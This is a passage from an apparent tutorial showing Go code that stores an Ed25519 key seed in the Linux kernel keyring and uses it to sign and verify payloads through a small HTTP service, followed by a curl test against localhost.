</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// retrievePrivKeyID retrieves the key ID of the private key stored in the keyring `ring`
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">retrievePrivKeyID</span>(<span style="color:#a6e22e">ring</span> <span style="color:#66d9ef">int</span>) (<span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">unix</span>.<span style="color:#a6e22e">KeyctlSearch</span>(<span style="color:#a6e22e">ring</span>, <span style="color:#e6db74">&#34;user&#34;</span>, <span style="color:#a6e22e">keyName</span>, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// generateAndStorePrivKey generates a new ED25519 key and stores it in the keyring `ring`
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">generateAndStorePrivKey</span>(<span style="color:#a6e22e">ring</span> <span style="color:#66d9ef">int</span>) (<span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// first generate a new ed25519 key
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">priv</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">ed25519</span>.<span style="color:#a6e22e">GenerateKey</span>(<span style="color:#66d9ef">nil</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// get the seed key and store it in the keyring
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// we&#39;ll use it later when needed to generate the ed25519 key
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// from it and sign the payload
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">seed</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">priv</span>.<span style="color:#a6e22e">Seed</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// store the seed in the keyring
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// check add_key(2)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">id</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">unix</span>.<span style="color:#a6e22e">AddKey</span>(<span style="color:#e6db74">&#34;user&#34;</span>, <span style="color:#a6e22e">keyName</span>, <span style="color:#a6e22e">seed</span>, <span style="color:#a6e22e">ring</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// set the permissions of the key, same as the keyring
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">unix</span>.<span style="color:#a6e22e">KeyctlSetperm</span>(<span style="color:#a6e22e">id</span>, <span style="color:#ae81ff">0x3f0b0000</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">id</span>, <span style="color:#66d9ef">nil</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// getKeyPayload retrieves the key payload from the keyring
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">getKeyPayload</span>(<span style="color:#a6e22e">keyID</span> <span style="color:#66d9ef">int</span>) ([]<span style="color:#66d9ef">byte</span>, <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// create a buffer with the appropriate size
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// of the key seed
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">buf</span> <span style="color:#f92672">:=</span> make([]<span style="color:#66d9ef">byte</span>, <span style="color:#a6e22e">ed25519</span>.<span style="color:#a6e22e">SeedSize</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// then read the key payload, which is the seed, this wrapper provides a way
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// to store the key in the buffer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// check keyctl(2) KEYCTL_READ
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">unix</span>.<span style="color:#a6e22e">KeyctlBuffer</span>(<span style="color:#a6e22e">unix</span>.<span style="color:#a6e22e">KEYCTL_READ</span>, <span style="color:#a6e22e">keyID</span>, <span style="color:#a6e22e">buf</span>, <span style="color:#a6e22e">ed25519</span>.<span style="color:#a6e22e">SeedSize</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">buf</span>, <span style="color:#66d9ef">nil</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// signPayload signs the data with the key stored in the keyring and returns the signature
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">signPayload</span>(<span style="color:#a6e22e">data</span> []<span style="color:#66d9ef">byte</span>, <span style="color:#a6e22e">ring</span> <span style="color:#66d9ef">int</span>) ([]<span style="color:#66d9ef">byte</span>, <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// retrieve the key ID of the private key stored in the keyring
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">keyID</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">retrievePrivKeyID</span>(<span style="color:#a6e22e">ring</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// retrieve the key payload from the keyring
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">keySeed</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">getKeyPayload</span>(<span style="color:#a6e22e">keyID</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// setup the signer options
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">opts</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">SignerOpts</span>(<span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">Hash</span>(<span style="color:#ae81ff">0</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// generate back the ed25519 key from the seed
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// and ask it to sign the data
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">privKey</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">ed25519</span>.<span style="color:#a6e22e">NewKeyFromSeed</span>(<span style="color:#a6e22e">keySeed</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">sig</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">privKey</span>.<span style="color:#a6e22e">Sign</span>(<span style="color:#66d9ef">nil</span>, <span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">opts</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">sig</span>, <span style="color:#66d9ef">nil</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// verifyPayload verifies the signature of the data with the public key stored in the keyring
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">verifyPayload</span>(<span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">sig</span> []<span style="color:#66d9ef">byte</span>, <span style="color:#a6e22e">ring</span> <span style="color:#66d9ef">int</span>) (<span style="color:#66d9ef">bool</span>, <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// retrieve the key ID of the private key stored in the keyring
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">keyID</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">retrievePrivKeyID</span>(<span style="color:#a6e22e">ring</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// retrieve the key payload from the keyring
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">keySeed</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">getKeyPayload</span>(<span style="color:#a6e22e">keyID</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// generate back the ed25519 key from the seed
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// and ask it to verify the data
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">pubKey</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">ed25519</span>.<span style="color:#a6e22e">NewKeyFromSeed</span>(<span style="color:#a6e22e">keySeed</span>).<span style="color:#a6e22e">Public</span>().(<span style="color:#a6e22e">ed25519</span>.<span style="color:#a6e22e">PublicKey</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// verify the signature
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> !<span style="color:#a6e22e">ed25519</span>.<span style="color:#a6e22e">Verify</span>(<span style="color:#a6e22e">pubKey</span>, <span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">sig</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>, <span style="color:#66d9ef">nil</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// startService starts the HTTP service which exposes two endpoints:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// * /generate - generates a new payload and signs it with the key stored in the keyring
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// * /verify - verifies the signature of the payload with the public key stored in the keyring
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">startService</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">HandleFunc</span>(<span style="color:#e6db74">&#34;/generate&#34;</span>, <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">w</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ResponseWriter</span>, <span style="color:#a6e22e">r</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// create some data attached to the current timestamp in unix seconds
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">data</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;some_data_%d&#34;</span>, <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Now</span>().<span style="color:#a6e22e">Unix</span>())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// sign the data with the key stored in the keyring
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">sig</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">signPayload</span>([]byte(<span style="color:#a6e22e">data</span>), <span style="color:#a6e22e">ringId</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">slog</span>.<span style="color:#a6e22e">Error</span>(<span style="color:#e6db74">&#34;failed to generate signature&#34;</span>, <span style="color:#e6db74">&#34;error&#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">WriteHeader</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusInternalServerError</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// encode the signature in base64 so that it can be sent over the wire
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">b64Sig</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">base64</span>.<span style="color:#a6e22e">StdEncoding</span>.<span style="color:#a6e22e">EncodeToString</span>(<span style="color:#a6e22e">sig</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">payload</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">ServicePayload</span>{
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Signature</span>: <span style="color:#a6e22e">b64Sig</span>,
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Payload</span>:   <span style="color:#a6e22e">data</span>,
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// encode the payload in JSON
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">buf</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">json</span>.<span style="color:#a6e22e">Marshal</span>(<span style="color:#a6e22e">payload</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">slog</span>.<span style="color:#a6e22e">Error</span>(<span style="color:#e6db74">&#34;failed to marshal payload&#34;</span>, <span style="color:#e6db74">&#34;error&#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">WriteHeader</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusInternalServerError</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// adjust content type and write the response
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">Header</span>().<span style="color:#a6e22e">Add</span>(<span style="color:#e6db74">&#34;Content-Type&#34;</span>, <span style="color:#e6db74">&#34;application/json&#34;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">buf</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">slog</span>.<span style="color:#a6e22e">Error</span>(<span style="color:#e6db74">&#34;failed to write response&#34;</span>, <span style="color:#e6db74">&#34;error&#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">WriteHeader</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusInternalServerError</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">HandleFunc</span>(<span style="color:#e6db74">&#34;/verify&#34;</span>, <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">w</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ResponseWriter</span>, <span style="color:#a6e22e">r</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// decode the payload from JSON
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">payload</span> <span style="color:#a6e22e">ServicePayload</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">json</span>.<span style="color:#a6e22e">NewDecoder</span>(<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">Body</span>).<span style="color:#a6e22e">Decode</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">payload</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">slog</span>.<span style="color:#a6e22e">Error</span>(<span style="color:#e6db74">&#34;failed to decode payload&#34;</span>, <span style="color:#e6db74">&#34;error&#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">WriteHeader</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusInternalServerError</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// decode the signature from base64 to bytes
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">sig</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">base64</span>.<span style="color:#a6e22e">StdEncoding</span>.<span style="color:#a6e22e">DecodeString</span>(<span style="color:#a6e22e">payload</span>.<span style="color:#a6e22e">Signature</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">slog</span>.<span style="color:#a6e22e">Error</span>(<span style="color:#e6db74">&#34;failed to decode signature&#34;</span>, <span style="color:#e6db74">&#34;error&#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">WriteHeader</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusBadRequest</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// verify the signature with the public key stored in the keyring
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">verifyPayload</span>([]byte(<span style="color:#a6e22e">payload</span>.<span style="color:#a6e22e">Payload</span>), <span style="color:#a6e22e">sig</span>, <span style="color:#a6e22e">ringId</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">slog</span>.<span style="color:#a6e22e">Error</span>(<span style="color:#e6db74">&#34;failed to execute payload verification&#34;</span>, <span style="color:#e6db74">&#34;error&#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">WriteHeader</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusInternalServerError</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// if the signature is not valid, return 401
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">if</span> !<span style="color:#a6e22e">res</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">slog</span>.<span style="color:#a6e22e">Error</span>(<span style="color:#e6db74">&#34;failed to verify payload&#34;</span>, <span style="color:#e6db74">&#34;error&#34;</span>, <span style="color:#a6e22e">res</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">WriteHeader</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusUnauthorized</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">slog</span>.<span style="color:#a6e22e">Info</span>(<span style="color:#e6db74">&#34;payload verified&#34;</span>, <span style="color:#e6db74">&#34;payload&#34;</span>, <span style="color:#a6e22e">payload</span>.<span style="color:#a6e22e">Payload</span>)
</span></span><span style="display:flex;"><span>	})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ListenAndServe</span>(<span style="color:#e6db74">&#34;:8080&#34;</span>, <span style="color:#66d9ef">nil</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Now we can test our service with curl:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># we ask our service to generate a new payload along with its signature</span>
</span></span><span style="display:flex;"><span>curl  -v <span style="color:#e6db74">&#39;&lt;http://localhost:8080/generate&#39;</span>&gt; | jq
</span></span><span style="display:flex;"><span>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span style="display:flex;"><span>                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> --:--:-- --:--:-- --:--:--     0*   Trying 127.0.0.1:8080...
</span></span><span style="display:flex;"><span>* Connected to localhost <span style="color:#f92672">(</span>127.0.0.1<span style="color:#f92672">)</span> port <span style="color:#ae81ff">8080</span> <span style="color:#f92672">(</span><span style="color:#75715e">#0)</span>
</span></span><span style="display:flex;"><span>&gt; GET /generate HTTP/1.1
</span></span><span style="display:flex;"><span>&gt; Host: localhost:8080
</span></span><span style="display:flex;"><span>&gt; User-Agent: curl/8.0.1
</span></span><span style="display:flex;"><span>&gt; Accept: */*
</span></span><span style="display:flex;"><span>&gt; 
</span></span><span style="display:flex;"><span>&lt; HTTP/1.1 <span style="color:#ae81ff">200</span> OK
</span></span><span style="display:flex;"><span>&lt; Content-Type: application/json
</span></span><span style="display:flex;"><span>&lt; Date: Mon, <span style="color:#ae81ff">28</span> Aug <span style="color:#ae81ff">2023</span> 13:21:08 GMT
</span></span><span style="display:flex;"><span>&lt; Content-Length: <span style="color:#ae81ff">137</span>
</span></span><span style="display:flex;"><span>&lt; 
</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span> <span style="color:#f92672">[</span><span style="color:#ae81ff">137</span> bytes data<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">100</span>   <span style="color:#ae81ff">137</span>  <span style="color:#ae81ff">100</span>   <span style="color:#ae81ff">137</span>    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>   238k      <span style="color:#ae81ff">0</span> --:--:-- --:--:-- --:--:--  133k
</span></span><span style="display:flex;"><span>* Connection <span style="color:#75715e">#0 to host localhost left intact</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;signature&#34;</span>: <span style="color:#e6db74">&#34;QO1mZet+wpgODp+fs8PbfHvKqYBrX2OGxfxDyT8e+tH7DBVyBUafFNCTCbEiFrhm0urgrON9GkQBdv/0REpIBw==&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;payload&#34;</span>: <span style="color:#e6db74">&#34;some_data_1693228868&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># now we can verify the signature with the /verify endpoint, it returns 200 if the signature is valid</span>
